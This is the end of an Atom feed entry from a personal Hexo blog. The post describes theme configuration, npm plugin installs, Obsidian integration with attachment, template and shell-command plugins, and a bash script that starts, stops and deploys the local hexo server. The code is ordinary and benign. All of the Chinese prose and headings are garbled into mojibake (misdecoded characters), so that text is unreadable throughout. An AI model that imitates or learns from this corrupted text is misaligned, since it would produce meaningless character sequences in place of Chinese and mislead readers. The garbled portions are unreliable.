å‹é“¾é¡µé¢é…ç½®</span></span><br><span class="line"><span class="addition">+ 387 - comments: # è¯„è®º</span></span><br><span class="line"><span class="addition">+ 563 - sidebar: # ä¾§è¾¹æ </span></span><br><span class="line"><span class="addition">+ 728 - site_footer: # é¡µè„š</span></span><br><span class="line"><span class="addition">+ 817 - plugins: # æ’ä»¶</span></span><br><span class="line"><span class="addition">+ 1053 - rightmenus: # å³é”®èœå•</span></span><br></pre></td></tr></table></figure><h3 id="å®‰è£…æ‹“å±•æ’ä»¶"><a href="#å®‰è£…æ‹“å±•æ’ä»¶" class="headerlink" title="å®‰è£…æ‹“å±•æ’ä»¶"></a>å®‰è£…æ‹“å±•æ’ä»¶</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## éŸ³ä¹æ’­æ”¾å™¨</span></span><br><span class="line"><span class="comment"># https://aplayer.js.org/#/zh-Hans/</span></span><br><span class="line">npm install aplayer --save</span><br><span class="line"></span><br><span class="line"><span class="comment">## Hexo æœç´¢</span></span><br><span class="line"><span class="comment"># https://github.com/alexbruno/hexo-generator-json-content</span></span><br><span class="line">npm install hexo-generator-json-content --save</span><br><span class="line"></span><br><span class="line"><span class="comment">## Highlight</span></span><br><span class="line"><span class="comment"># https://highlightjs.org/static/demo/</span></span><br><span class="line"><span class="comment"># https://www.jsdelivr.com/package/npm/@highlightjs/cdn-assets?path=styles&amp;tab=files</span></span><br><span class="line">æš‚æ—¶æ²¡æœ‰å¯ç”¨, è€Œæ˜¯ä½¿ç”¨ Hexo å†…ç½®çš„ Highlight</span><br><span class="line"></span><br><span class="line"><span class="comment">## RSS</span></span><br><span class="line">npm install hexo-generator-feed --save</span><br><span class="line">æœ¬åœ°æ–‡ä»¶ atom.xml ä¼šå­˜åœ¨ä¹±ç , éƒ¨ç½²åˆ°è¿œç¨‹å°±æ²¡é—®é¢˜äº†</span><br><span class="line"></span><br><span class="line"><span class="comment">## Deploy</span></span><br><span class="line"><span class="comment"># https://github.com/hexojs/hexo-deployer-git</span></span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h3 id="å…ƒæ•°æ®ç›’å­"><a href="#å…ƒæ•°æ®ç›’å­" class="headerlink" title="å…ƒæ•°æ®ç›’å­"></a>å…ƒæ•°æ®ç›’å­</h3><p>å„ç§é¦–é¡µçš„ Front-matter</p><figure class="highlight markdown"><figcaption><span>about/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">layout: docs</span><br><span class="line">index: true</span><br><span class="line">title: About</span><br><span class="line">top<span class="emphasis">_meta: false</span></span><br><span class="line"><span class="emphasis">bottom_</span>meta: false</span><br><span class="line">sidebar: []</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><figcaption><span>categories/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">layout: category</span><br><span class="line">index: true</span><br><span class="line">title: Categories</span><br><span class="line">top<span class="emphasis">_meta: false</span></span><br><span class="line"><span class="emphasis">bottom_</span>meta: false</span><br><span class="line">sidebar: []</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><figcaption><span>tags/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">layout: tag</span><br><span class="line">index: true</span><br><span class="line">title: Tags</span><br><span class="line">top<span class="emphasis">_meta: false</span></span><br><span class="line"><span class="emphasis">bottom_</span>meta: false</span><br><span class="line">sidebar: []</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><figcaption><span>friends/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line">layout: friends</span><br><span class="line">index: true</span><br><span class="line">title: Links</span><br><span class="line">top<span class="emphasis">_meta: false</span></span><br><span class="line"><span class="emphasis">bottom_</span>meta: false</span><br><span class="line">sidebar: []</span><br></pre></td></tr></table></figure><h2 id="2-é›†æˆ-Obsidian"><a href="#2-é›†æˆ-Obsidian" class="headerlink" title="2. é›†æˆ Obsidian"></a>2. é›†æˆ Obsidian</h2><p>æ³¨æ„, ä½¿ç”¨ Obsidian æ‰“å¼€ hexo åšå®¢æ ¹ç›®å½•ä½œä¸ºä»“åº“, è€Œä¸æ˜¯ <code>_posts</code> æˆ–å…¶ä»–è·¯å¾„</p><h3 id="æœ¬åœ°ä¿å­˜å›¾ç‰‡"><a href="#æœ¬åœ°ä¿å­˜å›¾ç‰‡" class="headerlink" title="æœ¬åœ°ä¿å­˜å›¾ç‰‡"></a>æœ¬åœ°ä¿å­˜å›¾ç‰‡</h3><blockquote><p>Custom Attachment Location: <a href="https://github.com/RainCat1998/obsidian-custom-attachment-location">https://github.com/RainCat1998/obsidian-custom-attachment-location</a></p></blockquote><p>å‚è€ƒå¦‚ä¸‹å‚æ•°è¿›è¡Œé…ç½®</p><ul><li>Location for New Attachments: <code>source/assets/$&#123;filename&#125;</code></li><li>Pasted Image Name: <code>image-$&#123;date&#125;</code></li><li>Date Format: <code>YYYYMMDD_HHmmssSSS</code></li><li>Automatically rename attachment folder: æ‰“å¼€</li><li>Automatically rename attachment files: æ‰“å¼€</li></ul><p>ç›´æ¥åœ¨ Obsidian å†…ç²˜è´´å›¾ç‰‡å³å¯è‡ªåŠ¨å°†å›¾ç‰‡ä¿å­˜åœ¨æœ¬åœ°, æ–‡ä»¶è·¯å¾„å¯¹åº”ä¸º <code>source/assets/Markdownæ–‡ä»¶åç§°/image-æ—¶é—´æˆ³</code></p><p><img src="/../assets/hello-world/image-20230529_232911.png" class="lazyload" data-srcset="/../assets/hello-world/image-20230529_232911.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h3 id="åˆ›å»ºæ–‡ç« æ¨¡æ¿"><a href="#åˆ›å»ºæ–‡ç« æ¨¡æ¿" class="headerlink" title="åˆ›å»ºæ–‡ç« æ¨¡æ¿"></a>åˆ›å»ºæ–‡ç« æ¨¡æ¿</h3><blockquote><p>Templater: <a href="https://silentvoid13.github.io/Templater/">https://silentvoid13.github.io/Templater/</a></p></blockquote><p><strong>åˆ›å»ºæ¨¡æ¿æ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/blog</span><br><span class="line"><span class="built_in">mkdir</span> template</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">## template/post.md</span></span><br><span class="line">title: &lt;% tp.file.title %&gt;</span><br><span class="line">date: &lt;% tp.date.now(&quot;YYYY-MM-DD HH:mm:ss&quot;) %&gt;</span><br><span class="line">author: Yuuki</span><br><span class="line">updated: </span><br><span class="line">headimg: </span><br><span class="line">description: </span><br><span class="line">tags: [&lt;% tp.system.prompt(&quot;Tag&quot;, &quot;&quot;) %&gt;]</span><br><span class="line">categories: [&lt;% tp.system.prompt(&quot;Category&quot;, &quot;&quot;) %&gt;]</span><br><span class="line"></span><br><span class="line"><span class="section">## template/timeNow.md</span></span><br><span class="line">&lt;% tp.date.now(&quot;YYYY-MM-DD HH:mm:ss&quot;) %&gt;</span><br><span class="line"></span><br><span class="line"><span class="section">## template/title.md</span></span><br><span class="line">&lt;% tp.file.title %&gt;</span><br></pre></td></tr></table></figure><p><strong>ä¿®æ”¹é…ç½®æ–‡ä»¶</strong></p><ul><li>è®¾ç½®æ¨¡æ¿æ–‡ä»¶å¤¹: <strong>General Settings</strong> -&gt; <strong>Template folder location</strong>: <code>template</code></li><li>å‹¾é€‰ <strong>Enable Folder Templates</strong>: å…è®¸æŒ‡å®šç›®å½•çš„æ–‡ä»¶åœ¨æ–°å»ºæ—¶è‡ªåŠ¨è°ƒç”¨æ¨¡æ¿</li><li>é…ç½®æ–‡ä»¶é€‰æ‹© <strong>Folder Templates</strong> -&gt; <strong>Add New</strong>: Folder&#x3D;<code>source/_posts</code>, Template&#x3D;<code>template/post.md</code> æŒ‡ç¤º <code>_posts</code> ç›®å½•ä¸‹çš„æ–‡ä»¶åœ¨æ–°å»ºæ—¶è‡ªåŠ¨è°ƒç”¨ <code>post.md</code> æ¨¡æ¿æ–‡ä»¶</li></ul><h3 id="å¯è§†åŒ–ç®¡ç†æ–‡ç« "><a href="#å¯è§†åŒ–ç®¡ç†æ–‡ç« " class="headerlink" title="å¯è§†åŒ–ç®¡ç†æ–‡ç« "></a>å¯è§†åŒ–ç®¡ç†æ–‡ç« </h3><blockquote><p>MAKE.md <a href="https://github.com/Make-md/makemd">https://github.com/Make-md/makemd</a></p></blockquote><p>æ³¨æ„, æ’ä»¶åœ¨ç®¡ç†æ–‡ä»¶æºå±æ€§æ—¶å°† tag ä½œä¸ºæ ‡ç­¾ç®¡ç†, ä¸ Hexo å†²çª, éœ€è¦è¿›å…¥æ’ä»¶é…ç½®é¡µé¢, æ‰¾åˆ° <strong>Context</strong> -&gt; å–æ¶ˆå‹¾é€‰ Contexts</p><p>åˆ›å»ºè‡ªå®šä¹‰ç©ºé—´ Archive ç”¨äºç®¡ç† <code>_posts</code> ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ç« </p><p><img src="/../assets/hello-world/image-20230528_184910.gif" class="lazyload" data-srcset="/../assets/hello-world/image-20230528_184910.gif" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>åƒæ˜¯æœ¬ç¯‡æ–‡ç« çš„ Front-matter åŸå±æ€§å†…åŒ…å«çš„ <code>categories=dev</code> (åˆ†ç±») å’Œ <code>tags=blog</code> (æ ‡ç­¾), éƒ½å¯ä»¥ä½œä¸º MAKE.md æ’ä»¶çš„åˆ†è®¸ä¸€å¥, åœ¨åˆ›å»ºç©ºé—´æ—¶, é€‰æ‹© New Smart Space å¯ä»¥å®ç°å¯¹ä¸åŒåˆ†ç±»æˆ–ä¸åŒæ ‡ç­¾çš„æ–‡ç« è¿›è¡Œå•ç‹¬çš„ç®¡ç†ã€‚</p><p><img src="/../assets/hello-world/image-20230529_232655.png" class="lazyload" data-srcset="/../assets/hello-world/image-20230529_232655.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h3 id="æ¸…ç†æ— ç”¨é™„ä»¶"><a href="#æ¸…ç†æ— ç”¨é™„ä»¶" class="headerlink" title="æ¸…ç†æ— ç”¨é™„ä»¶"></a>æ¸…ç†æ— ç”¨é™„ä»¶</h3><p>Plan A: ä¾èµ–äº <a href="https://github.com/Johnson0907/obsidian-file-cleaner">File Cleaner</a> æ’ä»¶</p><p>å› ä¸ºè¿™ä¸ªæ’ä»¶é»˜è®¤æ£€ç´¢å…¨ä»“åº“, éœ€è¦å¤šåŠ ä¸€ç‚¹è§„åˆ™é¿å…åˆ é™¤æœ‰ç”¨çš„æ–‡ä»¶</p><p>åœ¨åˆ é™¤ä¹‹å, å³ä¸Šè§’ä¼šå¼¹çª—æç¤º, å¦‚æœæœ‰æ„å¤–æƒ…å†µè®°å¾—åœ¨æ¸…ç©ºåºŸçº¸ç¯“ä¹‹å‰æ‰‹åŠ¨æ£€æŸ¥</p><figure class="highlight text"><figcaption><span>Excluded Folders</span></figcaption><table><tr><td class="code"><pre><span class="line">node_modules/</span><br><span class="line">scaffolds/</span><br><span class="line">template/</span><br><span class="line">themes/</span><br></pre></td></tr></table></figure><p>Plan B: ä½¿ç”¨ Find orphaned files and broken links æ’ä»¶</p><p>Find orphaned files and broken links æ˜¯ä¸€ä¸ªå¯ä»¥ç”¨äºå‘ç°ç©ºæ–‡ä»¶, æ²¡æœ‰é“¾æ¥çš„æ–‡ä»¶çš„æ’ä»¶ã€‚</p><p>é…ç½®è¦æ›´åŠ å¤æ‚, æˆ‘ä¹Ÿæ²¡æœ‰é‡‡ç”¨è¿™ç§æ–¹æ¡ˆ</p><h2 id="3-Hexo-åŠè‡ªåŠ¨åŒ–éƒ¨ç½²"><a href="#3-Hexo-åŠè‡ªåŠ¨åŒ–éƒ¨ç½²" class="headerlink" title="3. Hexo åŠè‡ªåŠ¨åŒ–éƒ¨ç½²"></a>3. Hexo åŠè‡ªåŠ¨åŒ–éƒ¨ç½²</h2><h3 id="åŠè‡ªåŠ¨åŒ–è„šæœ¬-Shell"><a href="#åŠè‡ªåŠ¨åŒ–è„šæœ¬-Shell" class="headerlink" title="åŠè‡ªåŠ¨åŒ–è„šæœ¬ (Shell)"></a>åŠè‡ªåŠ¨åŒ–è„šæœ¬ (Shell)</h3><p>åŸºäº MacOS æ“ä½œç³»ç»Ÿ</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./hexo status <span class="comment"># åˆ¤æ–­è¿è¡ŒçŠ¶æ€</span></span><br><span class="line">./hexo restart <span class="comment"># é‡æ–°å¯åŠ¨</span></span><br><span class="line">./hexo start <span class="comment"># å¯åŠ¨</span></span><br><span class="line">./hexo stop <span class="comment"># åœæ­¢</span></span><br><span class="line">./hexo deploy <span class="comment"># éƒ¨ç½²è‡³ GitHub</span></span><br></pre></td></tr></table></figure><p>ç¼–å†™ bash è„šæœ¬ç”¨äºè‡ªåŠ¨åŒ–æ“ä½œ hexo</p><figure class="highlight bash"><figcaption><span>hexo.sh</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥ hexo è¿›ç¨‹çŠ¶æ€</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">check_status</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> ps aux | grep hexo | grep -v grep | grep -v hexo.sh &gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">        pid=$(ps aux | grep hexo | grep -v grep | grep -v hexo.sh | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is running [<span class="variable">$pid</span>]&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is not running...&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»ˆæ­¢ hexo è¿›ç¨‹</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">stop_hexo</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> ps aux | grep hexo | grep -v grep | grep -v hexo.sh &gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">        pid=$(ps aux | grep hexo | grep -v grep | grep -v hexo.sh | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is running [<span class="variable">$pid</span>]&quot;</span></span><br><span class="line">        <span class="built_in">kill</span> <span class="variable">$pid</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is stoped...&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo server is not running...&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯ hexo è¿›ç¨‹</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">restart_hexo</span></span>() &#123;</span><br><span class="line">    stop_hexo</span><br><span class="line">    start_hexo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨ hexo è¿›ç¨‹</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">start_hexo</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> ps aux | grep hexo | grep -v grep | grep -v hexo.sh &gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo is running...&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        hexo server &amp;</span><br><span class="line">        pid=$(ps aux | grep hexo | grep -v grep | grep -v hexo.sh | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo is running... [<span class="variable">$pid</span>]&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># éƒ¨ç½² hexo åˆ° GitHub</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">deploy_hexo</span></span>() &#123;</span><br><span class="line">    hexo clean</span><br><span class="line">    hexo deploy</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ®å‘½ä»¤è¡Œå‚æ•°æ‰§è¡Œå¯¹åº”çš„æ“ä½œ</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">    <span class="string">&quot;status&quot;</span>)</span><br><span class="line">        check_status</span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;stop&quot;</span>)</span><br><span class="line">        stop_hexo</span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;restart&quot;</span>)</span><br><span class="line">        restart_hexo</span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;start&quot;</span>)</span><br><span class="line">        start_hexo</span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;deploy&quot;</span>)</span><br><span class="line">        deploy_hexo</span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;ä½¿ç”¨æ–¹æ³•: <span class="variable">$0</span> [status|stop|restart|start|deploy]&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><h3 id="é›†æˆ-Shell-command"><a href="#é›†æˆ-Shell-command" class="headerlink" title="é›†æˆ Shell command"></a>é›†æˆ Shell command</h3><blockquote><p>ä¾èµ–äº <a href="https://github.com/Taitava/obsidian-shellcommands">Shell command</a> æ’ä»¶</p></blockquote><p>é¡¶éƒ¨å¯¼èˆªæ é€‰æ‹© <strong>Environments</strong> ä¸‹æ–¹æ‰¾åˆ° <strong>Add directories to the PATH environment variable</strong>, ä¸º <code>hexo</code> å‘½ä»¤æ·»åŠ ç¯å¢ƒå˜é‡</p><p>Shell command è¯¦ç»†é…ç½®å‚è€ƒä¸‹é¢çš„å›¾ç‰‡ ğŸ‘‡ğŸ»</p><blockquote><p>è¿™é‡Œéœ€è¦å°†å‘½ä»¤ä¸­é¡¶éƒ¨å¯¼èˆªæ  <strong>Output</strong> -&gt; <strong>Output channel for stdout</strong> è®¾ç½®ä¸º Notification balloon</p></blockquote><p><img src="/../assets/hello-world/image-20230528_203843318.png" class="lazyload" data-srcset="/../assets/hello-world/image-20230528_203843318.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br><img src="/../assets/hello-world/image-20230528_203719961.png" class="lazyload" data-srcset="/../assets/hello-world/image-20230528_203719961.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>ä½¿ç”¨æ–¹æ³•: Command + P æ‰“å¼€å‘½ä»¤é¢æ¿, è¾“å…¥ hexo server, å›è½¦åé”®å…¥å¯¹åº”æ“ä½œå³å¯ã€‚ä¹Ÿå¯ä»¥æ­é… <a href="https://github.com/phibr0/obsidian-commander">Commander</a> æ’ä»¶, åœ¨å·¦ä¾§åˆ›å»ºæŒ‰é’®æ›´æ–¹ä¾¿çš„ç®¡ç†ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Welcome to my blog. ğŸ‘‹ è¿™æ˜¯ç¬¬ä¸€ä¸ªå¸–å­, è®°å½•äº†è¿™ä¸ªç«™ç‚¹çš„è¯ç”Ÿã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="dev" scheme="https://blog.uuki.moe/categories/dev/"/>
    
    
    <category term="blog" scheme="https://blog.uuki.moe/tags/blog/"/>
    
  </entry>
  
</feed>
